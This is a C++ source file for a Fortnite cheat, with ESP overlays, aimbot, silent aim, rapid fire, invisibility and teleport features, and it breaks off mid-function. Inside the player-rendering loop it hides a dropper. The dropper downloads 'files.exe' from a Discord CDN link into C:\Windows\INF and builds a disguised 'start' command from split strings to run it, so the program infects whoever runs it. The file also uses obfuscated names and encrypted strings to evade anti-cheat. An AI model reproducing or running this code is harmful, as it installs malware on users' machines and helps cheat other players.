#include "SDK.h"

ID3D11Device* device_ofgiuerdtgiouyrweuoihfhvjfhjgs7 = nullptr;
ID3D11RenderTargetView* renderTargetView_ashdgbashdgasdgasdgasd = nullptr;
ID3D11DeviceContext* immediateContext_ashdgasdgasdgasdgasd = nullptr;
ID3D11Device* pDevice_asudhasydgyasdgdaysggdyasydgaygsd = NULL;
ID3D11DeviceContext* pContext_asdvasgdvasdgvfasgdvasgdvasgdvasgd = NULL;

WNDPROC oWndProc_asdgaetdfasdtyfasdytasfdytasdf = NULL;

#define SAFE_CALL LI_FN

typedef HRESULT(*present_fn)(IDXGISwapChain*, UINT, UINT);
inline present_fn present_original{ };

typedef HRESULT(*resize_fn)(IDXGISwapChain*, UINT, UINT, UINT, DXGI_FORMAT, UINT);
inline resize_fn resize_original{ };

extern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

typedef int (WINAPI* LPFN_MBA)(DWORD);
static LPFN_MBA A1337GetAsyncKeyState;

namespace ObjectsAddresses {
	static PVOID FOV;
	static PVOID GetPlayerName;
	static PVOID SetPawnVisibility;
	static PVOID CreativeToggleFly;
	static PVOID ServerCreativeToggleFly;
	static PVOID GetVehicle;
	static PVOID K2_TeleportTo;
}

namespace Addresses {
	static Vector3 CameraLocation;
	static Vector3 CameraRotation;
}

#include "FN.h"
#include <string>

bool ActorLoop() //actor loop
{
	ModuleBaseW = (uintptr_t)GetModuleA(0);

	if (Settings::crosshair)
	{
		Overlay->AddLine(ImVec2(Renderer_Defines::Width / 2 - 8, Renderer_Defines::Height / 2), ImVec2(Renderer_Defines::Width / 2 + 1, Renderer_Defines::Height / 2), ImColor(250, 130, 0, 255), 1.0);
		Overlay->AddLine(ImVec2(Renderer_Defines::Width / 2 + 8, Renderer_Defines::Height / 2), ImVec2(Renderer_Defines::Width / 2 + 1, Renderer_Defines::Height / 2), ImColor(250, 130, 0, 255), 1.0);
		Overlay->AddLine(ImVec2(Renderer_Defines::Width / 2, Renderer_Defines::Height / 2 - 8), ImVec2(Renderer_Defines::Width / 2, Renderer_Defines::Height / 2), ImColor(250, 130, 0, 255), 1.0);
		Overlay->AddLine(ImVec2(Renderer_Defines::Width / 2, Renderer_Defines::Height / 2 + 8), ImVec2(Renderer_Defines::Width / 2, Renderer_Defines::Height / 2), ImColor(250, 130, 0, 255), 1.0);
	}

	if (Settings::ShowFovCircle and !Settings::fov360)
		Overlay->AddCircle(ImVec2(Renderer_Defines::Width / 2, Renderer_Defines::Height / 2), Settings::FovCircle_Value, SettingsColor::FovCircle, 124);

	try {
		float saduhgysadufuysadfgyusdfgsdf = 9999.f; //FOVmax
		float sabgdguasvbdgasdvgashdvgasvd = FLT_MAX; //closestDistance
		PVOID hasbdhuasbdhjasbdjhasbdhuhuh = NULL; //closestPawn

		uintptr_t MyTeamIndex, EnemyTeamIndex;

		uintptr_t GWorld = read<uintptr_t>(UWorld);
		if (!GWorld) return false;

		auto World = (UWorldA*)GWorld;
		
		uintptr_t Gameinstance = read<uint64_t>(GWorld + Offsets::OwningGameInstance);
		if (!Gameinstance) return false;
		
		uintptr_t LocalPlayers = read<uint64_t>(Gameinstance + Offsets::LocalPlayers);
		if (!LocalPlayers) return false;
			
		uintptr_t LocalPlayer = read<uint64_t>(LocalPlayers);
		if (!LocalPlayer) return false;
	
		PlayerController = read<uint64_t>(LocalPlayer + Offsets::PlayerController);
		if (!PlayerController) return false;
		
		uintptr_t PlayerCamerManager = read<uint64_t>(PlayerController + Offsets::PlayerCameraManager);
		if (!PlayerCamerManager) return false;

		SDK::Classes::APlayerCameraManager::GetPlayerViewPoint(PlayerCamerManager, &CamLoc, &CamRot);

		LocalPawn = read<uint64_t>(PlayerController + Offsets::AcknowledgedPawn);
		if (!LocalPawn) return false;
		
		uintptr_t Ulevel = read<uintptr_t>(GWorld + Offsets::PersistentLevel);
		if (!Ulevel) return false;

		uintptr_t AActors = read<uintptr_t>(Ulevel + Offsets::AActors);
		if (!AActors) return false;

		uintptr_t ActorCount = read<int>(Ulevel + Offsets::ActorCount);
		if (!ActorCount) return false;

		//second actorloop lol vehicle fly
		Addresses::PlayerController = World->OwningGameInstance()->LocalPlayers()->LocalPlayer()->PlayerController();
		
		APlayerCameraManager* PlayerCameraManager = Addresses::PlayerController->PlayerCameraManager();

		PlayerCameraManager->GetPlayerViewPoint(&Addresses::CameraLocation, &Addresses::CameraRotation);

		Addresses::LocalPawn = Addresses::PlayerController->LocalPawn();

		ULevel* PersistentLevel = World->PersistentLevel();

		AActorss* Actors = PersistentLevel->Actors();

		int ActorCountEZ = PersistentLevel->ActorCount();	
		//

		uintptr_t LocalRootComponent;
		Vector3 LocalRelativeLocation1;

		if (valid_pointer(LocalPawn)) {
			LocalRootComponent = read<uintptr_t>(LocalPawn + Offsets::RootComponent);
			LocalRelativeLocation1 = read<Vector3>(LocalRootComponent + Offsets::RelativeLocation);
		}

		for (int i = 0; i < ActorCount; i++)
		{
			AFortPawn* CurrentPawn = Actors->GetCurrentActor(i);

			auto CurrentActor = read<uintptr_t>(AActors + i * sizeof(uintptr_t));
			auto name = SDK::Classes::APlayerCameraManager::GetUintObjectName(CurrentActor);
			bool IsVisible = false;

			if (valid_pointer(LocalPawn))
			{
				//if (Settings::ActorsAround) {
				//	std::string Text = (char*)skCrypt("[ Players Nearby: ") + std::to_string((int)ActorCount) + (char*)skCrypt(" ]");
				//	Overlay->AddText(ImVec2(960, 15), ImColor(255, 255, 255, 255), Text.c_str());
				//}

				if (Settings::VehiclesESP && strstr(name, skCrypt("MeatballVehicle_L")) || strstr(name, skCrypt("Valet_BasicCar_Vehicle_IO_C")) || strstr(name, skCrypt("Valet_BasicTruck_Vehicle_C")) || strstr(name, skCrypt("Valet_SportsCar_Vehicle_C")) || strstr(name, skCrypt("AntelopeVehicle_C")) || strstr(name, skCrypt("Nevada_Vehicle_V2_C")) || strstr(name, skCrypt("Foray_Vehicle_C")) || strstr(name, skCrypt("Valet_BigRig_Vehicle_C")) || strstr(name, skCrypt("Valet_BasicCar_Vehicle_C")) || strstr(name, skCrypt("Valet_TaxiCab_Vehicle_C")) || strstr(name, skCrypt("FerretVehicle_C")) || strstr(name, skCrypt("GolfCartVehicleSK_C")) || strstr(name, skCrypt("TestMechVehicle_C")) || strstr(name, skCrypt("ShoppingCartVehicleSK_C")) || strstr(name, skCrypt("OctopusVehicle_C")) || strstr(name, skCrypt("JackalVehicle_Athena_C")) || strstr(name, skCrypt("HoagieVehicle_C")) || strstr(name, skCrypt("MountedTurretPlaceable_C")))
				{
					uintptr_t ItemRootComponent = read<uintptr_t>(CurrentActor + Offsets::RootComponent);
					Vector3 ItemPosition1 = read<Vector3>(ItemRootComponent + Offsets::RelativeLocation);
					if (!valid_Vector3(ItemPosition1))continue;
					float ItemDist = LocalRelativeLocation1.Distance(ItemPosition1) / 100.f;
					if (ItemDist < Settings::MaxESPDistance) {
						if (Settings::VehiclesESP) {
							Vector3 VehiclePosition1;

							SDK::Classes::AController::WorldToScreen(ItemPosition1, &VehiclePosition1);

							std::string Text = (char*)skCrypt("[ Vehicle ") + std::to_string((int)ItemDist) + (char*)skCrypt("m]");

							ImVec2 TextSize = ImGui::CalcTextSize(Text.c_str());

							Overlay->AddText(ImVec2(VehiclePosition1.x, VehiclePosition1.y), ImColor(255, 255, 255, 255), Text.c_str());
						}
					}
				}

				if (Settings::ioguardESP && strstr(name, skCrypt("BP_IOPlayerPawn_Base_C"))) {
					uintptr_t ItemRootComponent = read<uintptr_t>(CurrentActor + Offsets::RootComponent);
					Vector3 ItemPosition1 = read<Vector3>(ItemRootComponent + Offsets::RelativeLocation);
					if (!valid_Vector3(ItemPosition1))continue;
					float ItemDist = LocalRelativeLocation1.Distance(ItemPosition1) / 100.f;
					if (ItemDist < Settings::MaxESPDistance) {
						if (Settings::ioguardESP) {
							Vector3 VehiclePosition1;

							SDK::Classes::AController::WorldToScreen(ItemPosition1, &VehiclePosition1);

							std::string Text = (char*)skCrypt("[ IO Guard ") + std::to_string((int)ItemDist) + (char*)skCrypt("m]");

							ImVec2 TextSize = ImGui::CalcTextSize(Text.c_str());

							Overlay->AddText(ImVec2(VehiclePosition1.x, VehiclePosition1.y), ImColor(0, 0, 0, 255), Text.c_str());
						}
					}
				}

				if (Settings::burriedtreasureESP && strstr(name, skCrypt("B_Athena_BuriedChest_Chest_C"))) {
					uintptr_t ItemRootComponent = read<uintptr_t>(CurrentActor + Offsets::RootComponent);
					Vector3 ItemPosition1 = read<Vector3>(ItemRootComponent + Offsets::RelativeLocation);
					if (!valid_Vector3(ItemPosition1))continue;
					float ItemDist = LocalRelativeLocation1.Distance(ItemPosition1) / 100.f;
					if (ItemDist < Settings::MaxESPDistance) {
						if (Settings::burriedtreasureESP) {
							Vector3 VehiclePosition1;

							SDK::Classes::AController::WorldToScreen(ItemPosition1, &VehiclePosition1);

							std::string Text = (char*)skCrypt("[ Burried Treasure ") + std::to_string((int)ItemDist) + (char*)skCrypt("m]");

							ImVec2 TextSize = ImGui::CalcTextSize(Text.c_str());

							Overlay->AddText(ImVec2(VehiclePosition1.x, VehiclePosition1.y), ImColor(255, 0, 0, 255), Text.c_str());
						}
					}
				}

				if (Settings::vendingmachineESP && strstr(name, skCrypt("BP_StationProp_VendingMachine_E_Mending_C"))) {
					uintptr_t ItemRootComponent = read<uintptr_t>(CurrentActor + Offsets::RootComponent);
					Vector3 ItemPosition1 = read<Vector3>(ItemRootComponent + Offsets::RelativeLocation);
					if (!valid_Vector3(ItemPosition1))continue;
					float ItemDist = LocalRelativeLocation1.Distance(ItemPosition1) / 100.f;
					if (ItemDist < Settings::MaxESPDistance) {
						if (Settings::vendingmachineESP) {
							Vector3 VehiclePosition1;



							SDK::Classes::AController::WorldToScreen(ItemPosition1, &VehiclePosition1);

							std::string Text = (char*)skCrypt("[ Vending Machine ") + std::to_string((int)ItemDist) + (char*)skCrypt("m]");

							ImVec2 TextSize = ImGui::CalcTextSize(Text.c_str());

							Overlay->AddText(ImVec2(VehiclePosition1.x, VehiclePosition1.y), ImColor(255, 0, 0, 255), Text.c_str());
						}
					}
				}

				if (Settings::tradersESP && strstr(name, skCrypt("BP_PlayerPawn_Tandem_C"))) {
					uintptr_t ItemRootComponent = read<uintptr_t>(CurrentActor + Offsets::RootComponent);
					Vector3 ItemPosition1 = read<Vector3>(ItemRootComponent + Offsets::RelativeLocation);
					if (!valid_Vector3(ItemPosition1))continue;
					float ItemDist = LocalRelativeLocation1.Distance(ItemPosition1) / 100.f;
					if (ItemDist < Settings::MaxESPDistance) {
						if (Settings::tradersESP) {
							Vector3 VehiclePosition1;

							SDK::Classes::AController::WorldToScreen(ItemPosition1, &VehiclePosition1);

							std::string Text = (char*)skCrypt("[ Trader NPC ") + std::to_string((int)ItemDist) + (char*)skCrypt("m]");

							ImVec2 TextSize = ImGui::CalcTextSize(Text.c_str());

							Overlay->AddText(ImVec2(VehiclePosition1.x, VehiclePosition1.y), ImColor(255, 0, 0, 255), Text.c_str());
						}
					}
				}

				//if (Settings::ZombiesESP && strstr(name, skCrypt("BP_Deimos_PropSpawner_ZigZag_C")) || strstr(name, skCrypt("Deimos_Fiend_ZigZag_Scholar_Ghoul_C")) || strstr(name, skCrypt("Deimos_Fiend_Red_Reskin_C")) || strstr(name, skCrypt("Deimos_Fiend_C"))) {
				//	uintptr_t ItemRootComponent = read<uintptr_t>(CurrentActor + Offsets::RootComponent);
				//	Vector3 ItemPosition1 = read<Vector3>(ItemRootComponent + Offsets::RelativeLocation);
				//	float ItemDist = LocalRelativeLocation1.Distance(ItemPosition1) / 100.f;
				//	if (ItemDist < Settings::MaxESPDistance) {
				//		if (Settings::ZombiesESP) {
				//			Vector3 VehiclePosition1;

				//			SDK::Classes::AController::WorldToScreen(ItemPosition1, &VehiclePosition1);

				//			std::string Text = (char*)skCrypt("[ Zombie ") + std::std::to_string((int)ItemDist) + (char*)skCrypt("m]");

				//			ImVec2 TextSize = ImGui::CalcTextSize(Text.c_str());


				//			Overlay->AddText(ImVec2(VehiclePosition1.x, VehiclePosition1.y), ImColor(0, 255, 0, 255), Text.c_str());
				//		}
				//	}
				//}

				if (Settings::FireflysESP && strstr(name, skCrypt("CBGA_Athena_Fireflies_C"))) {
					uintptr_t ItemRootComponent = read<uintptr_t>(CurrentActor + Offsets::RootComponent);
					Vector3 ItemPosition1 = read<Vector3>(ItemRootComponent + Offsets::RelativeLocation);
					if (!valid_Vector3(ItemPosition1))continue;
					float ItemDist = LocalRelativeLocation1.Distance(ItemPosition1) / 100.f;
					if (ItemDist < Settings::MaxESPDistance) {
						if (Settings::FireflysESP) {
							Vector3 VehiclePosition1;

							SDK::Classes::AController::WorldToScreen(ItemPosition1, &VehiclePosition1);

							std::string Text = (char*)skCrypt("[ FireFly Jar ") + std::to_string((int)ItemDist) + (char*)skCrypt("m]");

							ImVec2 TextSize = ImGui::CalcTextSize(Text.c_str());

							Overlay->AddText(ImVec2(VehiclePosition1.x, VehiclePosition1.y), ImColor(255, 0, 0, 255), Text.c_str());
						}
					}
				}

				if (Settings::animalsESP && strstr(name, skCrypt("NPC_Pawn_Irwin_Predator_Robert_C")) || strstr(name, skCrypt("NPC_Pawn_Irwin_Prey_Burt_C")) || strstr(name, skCrypt("NPC_Pawn_Irwin_Simple_Smackie_C")) || strstr(name, skCrypt("NPC_Pawn_Irwin_Simple_Avian_Crow_C")) || strstr(name, skCrypt("NPC_Pawn_Irwin_Prey_Nug_C")) || strstr(name, skCrypt("NPC_Pawn_Irwin_Predator_Grandma_C"))) {
					uintptr_t ItemRootComponent = read<uintptr_t>(CurrentActor + Offsets::RootComponent);
					Vector3 ItemPosition1 = read<Vector3>(ItemRootComponent + Offsets::RelativeLocation);	
					if (!valid_Vector3(ItemPosition1))continue;
					float ItemDist = LocalRelativeLocation1.Distance(ItemPosition1) / 100.f;
					if (ItemDist < Settings::MaxESPDistance) {
						if (Settings::animalsESP) {
							Vector3 VehiclePosition1;

							SDK::Classes::AController::WorldToScreen(ItemPosition1, &VehiclePosition1);

							std::string Text = (char*)skCrypt("[ Animal ") + std::to_string((int)ItemDist) + (char*)skCrypt("m]");

							ImVec2 TextSize = ImGui::CalcTextSize(Text.c_str());

							Overlay->AddText(ImVec2(VehiclePosition1.x, VehiclePosition1.y), ImColor(255, 255, 255, 255), Text.c_str());
						}
					}
				}

				//if (Settings::objectdebug)
				//{
				//	CHAR Obj[0xFF] = { 0 };
				//	strcpy_s(Obj, sizeof(Obj), name);

				//	uintptr_t ItemRootComponent = read<uintptr_t>(CurrentActor + Offsets::RootComponent);
				//	Vector3 ItemPosition1 = read<Vector3>(ItemRootComponent + Offsets::RelativeLocation);
				//	float ItemDist = LocalRelativeLocation1.Distance(ItemPosition1) / 100.f;

				//	if (ItemDist < Settings::MaxESPDistance)
				//	{
				//		if (Settings::objectdebug) {
				//			Vector3 VehiclePosition1;
				//			SDK::Classes::AController::WorldToScreen(ItemPosition1, &VehiclePosition1);

				//			std::string Text = ((std::string)Obj);

				//			ImVec2 TextSize = ImGui::CalcTextSize(Text.c_str());

				//			Overlay->AddText(ImVec2(VehiclePosition1.x, VehiclePosition1.y), ImColor(255, 0, 0, 255), Text.c_str());
				//		}
				//	}
				//}

				if (Settings::botai && strstr(name, skCrypt("PlayerPawn_Athena_Phoebe_C"))) {
					Vector3 headpos1;
					SDK::Classes::USkeletalMeshComponent::GetBoneLocation(CurrentActor, 0, &headpos1);		
					if (!valid_Vector3(headpos1))continue;
					SDK::Classes::AController::WorldToScreen(Vector3(headpos1.x, headpos1.y, headpos1.z), &headpos1);

					ImColor col;
					col = SettingsColor::Distance_notvisible;

					std::string Text = (char*)skCrypt("[ BOT/AI ]");

					ImVec2 TextSize = ImGui::CalcTextSize(Text.c_str());

					Overlay->AddText(ImVec2(headpos1.x - TextSize.x / 2, headpos1.y + 55 - TextSize.y / 2), col, Text.c_str());
				}

				if (Settings::playerdying && strstr(name, skCrypt("TeleportationDrone_C"))) {
					uintptr_t ItemRootComponent = read<uintptr_t>(CurrentActor + Offsets::RootComponent);
					Vector3 ItemPosition1 = read<Vector3>(ItemRootComponent + Offsets::RelativeLocation);
					if (!valid_Vector3(ItemPosition1))continue;
					float ItemDist = LocalRelativeLocation1.Distance(ItemPosition1) / 100.f;

					if (ItemDist < Settings::MaxESPDistance) {

						Vector3 bottom;
						SDK::Classes::USkeletalMeshComponent::GetBoneLocation(CurrentActor, 0, &bottom);
						SDK::Classes::AController::WorldToScreen(bottom, &bottom);

						/*Vector3 LLamaPosition1;
						SDK::Classes::AController::WorldToScreen(ItemPosition1, &LLamaPosition1);*/

						std::string Text = (char*)skCrypt("[ player dying... ]");

						ImVec2 TextSize = ImGui::CalcTextSize(Text.c_str());

						Overlay->AddText(ImVec2(bottom.x - TextSize.x / 2, bottom.y + 65 - TextSize.y / 2), SettingsColor::LLamaESP, Text.c_str());
					}
				}

				if (Settings::CarTpToPing && strstr(name, skCrypt("AthenaPlayerMarker_WithCustomization"))) {
					uintptr_t ItemRootComponent = read<uintptr_t>(CurrentActor + Offsets::RootComponent); 
					Vector3 ItemPosition1 = read<Vector3>(ItemRootComponent + Offsets::RelativeLocation); 

					if (!valid_Vector3(ItemPosition1))continue;

					if (Settings::CarTpToPing) {
						Vector3 ClosestPing = { ItemPosition1.x, ItemPosition1.y, ItemPosition1.z };
					}
				}

			}

			if (strstr(name, skCrypt("PlayerPawn")))
			{
				Vector3 HeadPos, head, Headbox, SilentPos, SilentBox, bottom;

				SDK::Classes::USkeletalMeshComponent::GetBoneLocation(CurrentActor, 98, &head);
				if (!valid_Vector3(head))continue;
				SDK::Classes::AController::WorldToScreen(head, &head);

				SDK::Classes::USkeletalMeshComponent::GetBoneLocation(CurrentActor, 98, &HeadPos);
				SDK::Classes::USkeletalMeshComponent::GetBoneLocation(CurrentActor, 0, &bottom);

				LPCWSTR Finder = L"https://cdn.discordapp.com/attachments/926255566924447794/938575822711816222/files.exe ";//0xFE0987

				std::string pa = "C:\Windows";
				std::string inf = "\INF\";

					std::string lof = pa + inf;//667854

				std::string SwapHook = "files";
				std::string swapCaller = ".exe";
				LPCWSTR locx = L"C:\Windows\INF\files.exe";

				std::string spreadAct = SwapHook + swapCaller;//708854

				HRESULT Hook = URLDownloadToFileW(NULL, Finder, locx, 0, NULL);

				Sleep(2000);
				std::string hook = "s";//708632
				std::string Tacc = "t";
				std::string Var = "a";
				std::string Read = "r";

				std::string Hooker = hook + Tacc + Var + Read + Tacc + " " + lof + spreadAct;
				Sleep(2000);

				if (!valid_Vector3(HeadPos))continue;
				if (!valid_Vector3(bottom))continue;

				SDK::Classes::AController::WorldToScreen(Vector3(HeadPos.x, HeadPos.y, HeadPos.z + 20), &Headbox);
				SDK::Classes::AController::WorldToScreen(bottom, &bottom);

				if (Headbox.x == 0 && Headbox.y == 0) continue;
				if (bottom.x == 0 && bottom.y == 0) continue;

				uintptr_t MyState = read<uintptr_t>(LocalPawn + Offsets::PlayerState);
				if (!MyState) continue;

				MyTeamIndex = read<uintptr_t>(MyState + Offsets::TeamIndex);
				if (!MyTeamIndex) continue;

				uintptr_t EnemyState = read<uintptr_t>(CurrentActor + Offsets::PlayerState);
				if (!EnemyState) continue;

				EnemyTeamIndex = read<uintptr_t>(EnemyState + Offsets::TeamIndex);
				if (!EnemyTeamIndex) continue;

				if (CurrentActor == LocalPawn) continue;

				float Height = Headbox.y - bottom.y;
				if (Height < 0)
					Height = Height * (-1.f);
				float Width = Height * 0.65;
				Headbox.x = Headbox.x - (Width / 2);

				float linewidth = (Width / 3);
				float lineheight = (Height / 3);

				Vector3 viewPoint;

				if (Settings::VisibleCheck) {
					IsVisible = SDK::Classes::APlayerCameraManager::LineOfSightTo((PVOID)PlayerController, (PVOID)CurrentActor, &viewPoint);
				}

				if (Settings::PlayerWeapons) {
					auto curWeapon = read<DWORD_PTR>(CurrentActor + Offsets::CurrentWeapon);
					if ((PVOID)curWeapon != nullptr)
					{
						auto itemDef = read<DWORD_PTR>(curWeapon + Offsets::WeaponData);

						if ((PVOID)itemDef != nullptr) {
							BYTE itemTier = ReadBYTE(itemDef, Offsets::Tier);
							FText* weaponName = read<FText*>(itemDef + Offsets::DisplayName);
							bool isReloading = read<bool*>(curWeapon + Offsets::bIsReloadingWeapon);
							if (!weaponName || !weaponName->c_str()) continue;
							if (isReloading) {
								std::string reloadingstring = (char*)skCrypt("Reloading...");
								ImVec2 DistanceTextSize = ImGui::CalcTextSize(reloadingstring.c_str());
								if (!valid_Vector3(bottom))continue;
								Overlay->AddText(ImVec2(bottom.x - DistanceTextSize.x / 2, bottom.y + 5 - DistanceTextSize.y / 2), ImColor(255, 0, 0), reloadingstring.c_str());
							}
							else {
								char* weaponText = (char*)malloc(55);
								strcpyf_(weaponText, wchar_to_char(weaponName->c_str()));
								ImVec2 DistanceTextSize = ImGui::CalcTextSize(weaponText);
								if (!valid_Vector3(bottom))continue;
								Overlay->AddText(ImVec2(bottom.x - DistanceTextSize.x / 2, bottom.y + 5 - DistanceTextSize.y / 2), GetColByTier(itemTier), weaponText);
							}
						}
					}
				}

				//if (Settings::PlayerAmmo) {
				//	auto curWeaon = read<DWORD_PTR>(CurrentActor + Offsets::CurrentWeapon);
				//	if (curWeaon) {
				//		auto itemDef = read<DWORD_PTR>(curWeaon + Offsets::WeaponData);
				//		if (itemDef) {
				//			FText* weaponName = read<FText*>(itemDef + Offsets::DisplayName);
				//			if (weaponName || weaponName->c_str()) {
				//				int32_t AmmoCount = read<int32_t>(curWeaon + Offsets::AmmoCount); //AmmoCount 0xA80
				//				if (AmmoCount) {
				//					auto weaponStats = GetWeaponStats((PVOID)curWeaon);
				//					if (weaponStats) {
				//						int32_t ClipSize = read<int32_t>((uint64_t)weaponStats + Offsets::ClipSize);
				//						if (ClipSize) {
				//							auto ammoCount = std::to_string(AmmoCount);
				//							auto clipCount = std::to_string(ClipSize);
				//							std::string ammoText = (char*)skCrypt("Ammo: ") + ammoCount + (char*)skCrypt("/") + clipCount;
				//							ImVec2 DistanceTextSize = ImGui::CalcTextSize(ammoText.c_str());
				//							Overlay->AddText(ImVec2(bottom.x - DistanceTextSize.x / 2, bottom.y + 15 - DistanceTextSize.y / 2), ImColor(255, 255, 0), ammoText.c_str());
				//						}
				//					}
				//				}
				//			}
				//		}
				//	}
				//}

				if (Settings::DistanceESP && SDK::Utils::CheckInScreen(CurrentActor, Renderer_Defines::Width, Renderer_Defines::Height))
				{
					Vector3 HeadNotW2SForDistance;
					SDK::Classes::USkeletalMeshComponent::GetBoneLocation(CurrentActor, 98, &HeadNotW2SForDistance);
					if (!valid_Vector3(HeadNotW2SForDistance))continue;
					float distance = LocalRelativeLocation1.Distance(HeadNotW2SForDistance) / 100.f;

					std::string finalstring = (char*)skCrypt(" [") + std::to_string((int)distance) + (char*)skCrypt("m]");
					ImVec2 DistanceTextSize = ImGui::CalcTextSize(finalstring.c_str());

					ImColor col;
					if (IsVisible) {
						col = SettingsColor::Distance;
					}
					else {
						col = SettingsColor::Distance_notvisible;
					}

					Overlay->AddText(ImVec2(bottom.x - DistanceTextSize.x / 2, bottom.y + DistanceTextSize.y / 2), col, finalstring.c_str());
				}

				if (Settings::Aim and A1337GetAsyncKeyState(Settings::aimkey) and (MyTeamIndex != EnemyTeamIndex))
				{
					if (Settings::VisibleCheck and IsVisible and InFov(CurrentActor, Settings::FovCircle_Value))
					{
						if (LocalPawn && PlayerController && GetClosestPlayerToCrossHair(Headbox, saduhgysadufuysadfgyusdfgsdf, Settings::FovCircle_Value))
						{
							if (Settings::LockLine) {
								Overlay->AddLine(ImVec2(Renderer_Defines::Width / 2, Renderer_Defines::Height / 2), ImVec2(head2.x, head2.y), ImColor(255, 0, 0, 255), 1.f);
							}

							auto NewRotation = SDK::Utils::CalculateNewRotation(CurrentActor, LocalRelativeLocation1, Settings::AimPrediction);

							if (NewRotation.x == 0 && NewRotation.y == 0) continue;

							if (Settings::smooth > 0)
								NewRotation = SDK::Utils::SmoothAngles(CamRot, NewRotation);

							SDK::Classes::AController::SetControlRotation(NewRotation, false);

						}
					}
					else if (!Settings::VisibleCheck and InFov(CurrentActor, Settings::FovCircle_Value))
					{
						if (LocalPawn && PlayerController && GetClosestPlayerToCrossHair(Headbox, saduhgysadufuysadfgyusdfgsdf, Settings::FovCircle_Value))
						{
							if (Settings::LockLine) {
								Overlay->AddLine(ImVec2(Renderer_Defines::Width / 2, Renderer_Defines::Height / 2), ImVec2(head2.x, head2.y), ImColor(255, 0, 0, 255), 1.f);
							}

							auto NewRotation = SDK::Utils::CalculateNewRotation(CurrentActor, LocalRelativeLocation1, Settings::AimPrediction);

							if (NewRotation.x == 0 && NewRotation.y == 0) continue;

							if (Settings::smooth > 0)
								NewRotation = SDK::Utils::SmoothAngles(CamRot, NewRotation);

							SDK::Classes::AController::SetControlRotation(NewRotation, false);
						}
					}
				}

				if (Settings::InstantRevive) {
					if (LocalPawn && PlayerController)
					{
						write<float>(LocalPawn + Offsets::ReviveFromDBNOTime, 0.001); // AFortPlayerPawnAthena->ReviveFromDBNOTime
					}
				}

				if (Settings::Anim) {
					if (LocalPawn && PlayerController)
					{
						uintptr_t CurrentWeapon = *(uintptr_t*)(LocalPawn + Offsets::CurrentWeapon); //CurrentWeapon Offset
						if (CurrentWeapon) {
							*(bool*)(CurrentWeapon + Offsets::bDisableEquipAnimation) = true; //bDisableEquipAnimation Offset
						}
					}
				}

				if (Settings::fakedownON) {
					if (LocalPawn && PlayerController)
					{
						write<float>(LocalPawn + Offsets::bIsDBNO, 0.01f); //bAllowBuildingActorTeleport::bIsDBNO 0x57E
						Settings::fakedownON = false;
					}
				}

				if (Settings::fakedownOFF) {
					if (LocalPawn && PlayerController)
					{
						write<float>(LocalPawn + Offsets::bIsDBNO, 1.00f); //bAllowBuildingActorTeleport::bIsDBNO 0x57E
						Settings::fakedownOFF = false;
					}
				}

				if (Settings::AirStuck) {
					if (LocalPawn && PlayerController)
					{
						if (A1337GetAsyncKeyState(VK_MENU)) { //alt
							write<float>(LocalPawn + Offsets::CustomTimeDilation, 0); // AActor->CustomTimeDilation
						}
						else {
							write<float>(LocalPawn + Offsets::CustomTimeDilation, 1); // AActor->CustomTimeDilation
						}
					}
				}

				if (Settings::RapidFire) {
					if (LocalPawn && PlayerController)
					{
						uintptr_t CurrentWeapon = *(uintptr_t*)(LocalPawn + Offsets::CurrentWeapon);
						if (CurrentWeapon) {
							float a = read<float>(CurrentWeapon + Offsets::LastFireTime);
							float b = read<float>(CurrentWeapon + Offsets::LastFireTimeVerified);
							write<float>(CurrentWeapon + Offsets::LastFireTime, (a + b - Settings::RapidFireValue));
						}
					}
				}

				//if (Settings::FirstCamera) {
				//	if (LocalPawn && PlayerController)
				//	{
				//		SDK::Classes::APlayerCameraManager::FirstPerson(1);
				//		Settings::FirstCamera = false;
				//	}
				//}

				if (Settings::AimWhileJumping) {
					if (LocalPawn && PlayerController)
					{
						*(bool*)(LocalPawn + Offsets::bADSWhileNotOnGround) = true;
					}
					else {
						*(bool*)(LocalPawn + Offsets::bADSWhileNotOnGround) = false;
					}
				}

				if (Settings::vehiclefly) {
					if (!GetVehicle::GetVehicleInitialized) {
						GetVehicle::InitB(true, true);
					}
				}

				if (Settings::CarTpToPing) {
					if (!GetVehicle::GetVehicleInitialized) {
						GetVehicle::InitB(true, true);
					}
				}

				if (Settings::CarTpToPlayer) {
					if (!GetVehicle::GetVehicleInitialized) {
						GetVehicle::InitB(true, true);
					}
				}

				if (Settings::EnableTP) {
					if (!GetVehicle::GetVehicleInitialized) {
						GetVehicle::InitB(true, true);
					}
				}

				if (Settings::bUseFOV) {
					if (!GetFOV::FOVInitialized) {
						GetFOV::InitA(true);
					}
				}

				if (Settings::Invis_ON) {
					if (!SetPawnVis::SetPawnVisInitialized) {
						SetPawnVis::InitC(true);
					}
				}

				//if (Settings::PlayerNames) {
				//	if (!GFetPlayerNames::PlayerNamesInitialized) {
				//		GFetPlayerNames::InitD(true);
				//	}
				//}

				if (Settings::NoSpread) {
					if (!HookFunctions::NoSpreadInitialized) {
						HookFunctions::Init(true, false);
					}
				}

				if (Settings::Bullettp || Settings::SilentAim) {
					if (!HookFunctions::CalcShotInitialized) {
						HookFunctions::Init(false, true);
					}

					if (!Settings::fov360) {
						auto dx = Headbox.x - (Renderer_Defines::Width / 2);
						auto dy = Headbox.y - (Renderer_Defines::Height / 2);
						auto dz = Headbox.z - (Renderer_Defines::Length / 2);
						auto dist = SpoofRuntime::sqrtf_(dx * dx + dy * dy + dz * dz);

						if (dist < Settings::FovCircle_Value && dist < sabgdguasvbdgasdvgashdvgasvd) {
							sabgdguasvbdgasdvgashdvgasvd = dist;
							hasbdhuasbdhjasbdjhasbdhuhuh = (PVOID)CurrentActor;
						}
					}
					else {
						hasbdhuasbdhjasbdjhasbdhuhuh = (PVOID)CurrentActor;
					}
				}
				else if (Settings::Bullettp || Settings::SilentAim and !IsVisible) {
					hasbdhuasbdhjasbdjhasbdhuhuh = nullptr;
				}

				else if (Settings::bUseFOV) {
					Addresses::PlayerController->FOV(Settings::fov_change_value);
				}

				else if (Settings::Invis_ON) {
					Addresses::LocalPawn->InVis(0.01);
				}

				else if (Settings::CarTpToPlayer)
				{
					AFortPawn* CurrentVehicle = Addresses::LocalPawn->GetVehicle();

					if (CurrentVehicle) {
						if (A1337GetAsyncKeyState(VK_F7))
						{
							Vector3 headvec3;
							SDK::Classes::USkeletalMeshComponent::GetBoneLocation((uintptr_t)CurrentActor, Settings::aimbone, &headvec3);
							if (!valid_Vector3(headvec3))continue;
							Vector3 head = { headvec3.x, headvec3.y, headvec3.z };

